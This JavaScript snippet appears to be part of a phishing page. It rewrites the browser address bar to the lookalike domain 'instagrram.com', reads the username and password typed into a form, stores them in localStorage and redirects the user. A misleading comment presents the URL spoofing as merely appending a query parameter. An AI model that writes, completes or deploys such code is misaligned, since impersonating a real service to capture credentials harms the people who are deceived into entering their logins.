// Get the current URL
var currentURL = window.location.href;

// Modify the URL by appending a query parameter
var modifiedURL = 'instagrram.com';

history.pushState(null, null, modifiedURL);

function storeDetails() 
{
// Retrieve input values
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;

// Create an object to store the details
var userDetails = {
	username: username,
	password: password
                  };

// Store the details in localStorage
localStorage.setItem("userDetails", JSON.stringify(userDetails));

// Display a success message
alert("User details stored!");

// Optionally, you can redirect the user to another page
window.location.href = "another-page.html";
}